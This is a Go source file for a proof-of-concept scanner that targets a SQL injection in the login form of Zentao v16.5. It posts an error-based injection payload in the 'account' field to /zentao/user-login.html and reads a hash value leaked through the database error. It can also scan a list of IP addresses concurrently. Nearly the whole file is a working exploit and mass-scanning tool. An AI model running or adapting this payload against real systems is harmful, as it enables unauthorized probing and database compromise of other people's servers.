package main

import (
	"bufio"
	"crypto/md5"
	"fmt"
	"github.com/imroc/req/v3"
	"io"
	"math/rand"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var wg sync.WaitGroup
var stamp bool

type ZentaoSqli struct {
}

func NewZentaoSQLI() *ZentaoSqli {
	return &ZentaoSqli{}
}

func (z *ZentaoSqli) r0(ip string, client *req.Client) (bool, error) {
	randNum := z.randInt()
	payload := "account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28" + url.QueryEscape("MD5("+randNum+")") + "%29%2C0x7e%29%29%29%23"
	resp, err := z.payload(ip, payload, client)
	if err != nil {
		return false, err
	}
	md5Num := z.md5d16(randNum)
	if resp.StatusCode == 200 && strings.Contains(resp.String(), md5Num) {
		return true, nil
	}
	return false, nil

}

func (z *ZentaoSqli) payload(ip, payload string, client *req.Client) (*req.Response, error) {
	resp, err := client.R().SetHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36").
		SetHeader("Accept", "application/json, text/javascript, */*; q=0.01").
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		SetHeader("Referer", "http://"+ip+"/zentao/user-login.html").
		SetBody(payload).
		Post("http://" + ip + "/zentao/user-login.html")
	if err != nil {
		return nil, err
	}
	return resp, nil
}

func (z *ZentaoSqli) sqliScan(ip string) {
	if stamp {
		defer wg.Done()
	}
	client := req.C()
	r0, err := z.r0(ip, client)
	if err != nil {
		fmt.Printf("[ERROR]:%v\n", err)
		return
	}
	if r0 {
		fmt.Printf("[INFO]:[%s] Zentao v16.5 SQL Injection Existent\n", ip)
	} else {
		fmt.Printf("[INFO]:[%s] Zentao v16.5 SQL Injection Non-Existent\n", ip)
	}

}

func (z *ZentaoSqli) batchSqliScan(path string) {
	stamp = true
	begin := time.Now()
	fmt.Println("[INFO]:Scan...")
	f, err := os.Open(path)

	if err != nil {
		fmt.Printf("[ERROR]:%v\n", err)
		return
	}

	r := bufio.NewReader(f)

	for {
		ip, err := r.ReadString('\n')
		ip = strings.TrimSpace(ip)
		if err != nil && err != io.EOF {
			fmt.Printf("[ERROR]:%v\n", err)
			return
		}
		if ip != "" {
			wg.Add(1)
			go z.sqliScan(ip)
		}
		if err == io.EOF {
			break
		}
	}
	wg.Wait()
	timeDif := time.Now().Sub(begin)
	fmt.Println("[INFO]:Take", timeDif)
}

func (z *ZentaoSqli) md5d16(randNum string) string {
	md5d32 := md5.Sum([]byte(randNum))
	md5d16 := fmt.Sprintf("%x", md5d32)
	return md5d16[8:24]
}

func (z *ZentaoSqli) randInt() string {
	rand.Seed(time.Now().UnixNano())
	r1 := rand.Intn(100000)
	r2 := rand.Intn(100000)
	sum := r1 + r2
	return strconv.Itoa(sum)
}
